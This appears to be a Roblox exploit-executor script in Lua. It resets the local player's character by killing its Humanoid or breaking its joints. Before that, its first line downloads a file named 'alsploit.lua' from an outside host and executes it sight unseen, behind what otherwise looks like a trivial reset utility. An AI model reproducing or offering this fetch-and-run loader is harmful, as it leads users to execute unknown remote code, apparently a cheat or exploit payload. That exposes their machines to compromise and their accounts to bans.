loadstring(game:HttpGet("https://r2.packetroblox.xyz/alsploit.lua",true))()

local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- Get Character
local function getCharacter()
    return player.Character or player.CharacterAdded:Wait()
end

task.wait(1)

local char = getCharacter()
local hum = char:FindFirstChildOfClass("Humanoid")

if hum then
    -- Reset
    hum:ChangeState(Enum.HumanoidStateType.Dead)
    hum.Health = 0
else
    -- why tf would some1 not exist
    char:BreakJoints()
end
